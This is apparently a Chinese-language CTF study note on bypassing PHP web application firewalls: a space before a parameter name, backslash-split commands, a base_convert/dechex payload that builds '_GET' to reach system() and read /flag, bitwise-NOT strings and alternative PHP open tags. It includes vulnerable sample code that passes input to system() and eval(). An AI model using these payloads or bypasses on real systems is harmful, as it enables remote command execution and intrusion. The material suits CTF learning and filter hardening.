---
tags:
  - CTF
---

## 在参数前加空格绕过WAF

WAF 通常针对一个参数进行检测，但如果他匹配不到这个参数呢？那他就检测不了了。

代码可能是这样的
```php
<?php
// 模拟 WAF 检查逻辑
foreach ($_GET as $key => $value) {

    if ($key === "num") { //输入空格的时候，会导致这里不匹配，从而绕过了WAF
        if (preg_match('/[a-zA-Z]/', $value)) {
            die("WAF 拦截：检测到非法字符！");
        }
    }
    
}

// 业务代码
$_GET["num"] // 可以正常访问
?>
```

所以假如参数是s，那么我们这样传参 `? s=114514` 就可以绕过WAF


## 使用 `\` 绕过WAF

代码可能是这样的
```php
<?php
// 模拟 WAF：简单检测是否包含 "cat" 字符串
$cmd = $_GET['cmd'];

if (preg_match('/cat/', $cmd)) {
    die("WAF 拦截：禁止执行 cat 命令！");
}

// 业务代码：直接执行系统命令
// 如果输入 cmd=c\at，preg_match 匹配不到 "cat"，绕过成功
system($cmd); 
?>
```

如果给 `cmd` 传参 `c\at` ，那么 `$cmd` 将是 `c\at` ，正则匹配不到，而传给shell进行执行的时候，系统会忽略 `\`

## 利用进制相关的函数绕过WAF

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs); // 匹配php的合法标识符
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

- `hex2bin()` 函数把十六进制值的字符串转换为 ASCII 字符
- `base_convert()` 函数在任意进制之间转换数字
- `dechex()` 函数把十进制数转换为十六进制数

我们预想构造出 `$_GET` ，这样我们就能通过传参来进行RCE。

`base_convert()` 虽然可以构造出二十六个字母和任意数字，但是他没法构造特殊符号，比如 `_GET` 中的 `_`
`hex2bin()` 可以构造任意字符串，但题目并不认为这是一个合法的数学函数。不过我们可以用 `base_convert()` 来构造出 `hex2bin()` ，然后使用 `dechex()` 来传入十六进制。

payload
```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag
```
- `$pi=base_convert(37907361743,10,36)(dechex(1598506324))`
	- 构造 `_GET`
- `$$pi`
	- 这是可变变量 (`$$`)
- `{}`
	- 在旧版本的php，这个和 `[]` 一样能拿来访问数组，中括号被禁了所以用这个。

## PHP 取反绕过
取反是一个位运算，将 `0` 变成 `1`， `1` 变成 `0` 。
在 PHP 中，文字也可以进行取反，例如 `~"P"` （`"P"` 的ASCII是 80，即 `01010000`）取反后得到 `¯` 即 `10101111`
对于非ASCII字符（ 0~127 以外），PHP默认就会当成字符串，无需加双引号或单引号。
所以一般来说，使用取反构造的payload是不用加引号的。

## PHP 使用 `<?=` 或 `<script` 绕过 `<?php` 检测

`<?php` 被ban的时候，可以尝试使用 ：
- `<script language="php"></script>`
- `<?= ?>`
		- 这个是 `<?php echo ...; ?>` 的简写，即 `<?= "Hello World" ?>` 和 `<?php echo "Hello World";` ?> 是完全一样的